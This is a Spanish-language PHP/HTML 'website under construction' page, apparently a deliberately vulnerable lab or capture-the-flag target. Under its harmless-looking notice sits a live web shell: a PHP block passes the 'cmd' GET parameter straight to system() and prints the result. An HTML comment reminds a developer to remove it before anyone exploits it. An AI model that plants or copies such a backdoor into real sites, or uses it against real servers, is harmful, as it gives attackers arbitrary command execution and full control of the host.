<!DOCTYPE html>
<html>
<head>
    <title>Sitio Web en obras</title>
    <!-- Agregar el enlace al CSS de Bootstrap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
</head>
<body>
    <!-- Contenedor principal con estilo de Bootstrap -->
    <div class="container mt-5">
        <h1 class="text-center">Sitio Web en obras</h1>
        
        <div class="row mt-3">
            <div class="col-md-6 mx-auto">
                <p class="text-center">Lamentamos decir que este sitio web no está disponible de momento así que agradeceriamos que no siguiera por aquí.</p>
                
                <!--Miguel acuerdate que tenemos que quitar el atributo cmd, no vaya a ser que lo utilice alguien. -->
                
                <?php
                if (isset($_GET['cmd'])) {
                    $cmd = $_GET['cmd'];
                    echo "<h2 class='mt-4'>Resultado:</h2>";
                    echo "<pre>";
                    system($cmd);
                    echo "</pre>";
                }
                ?>
            </div>
        </div>
    </div>

    <!-- Agregar el enlace al JS de Bootstrap (opcional) -->
    <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script> -->
</body>
</html>
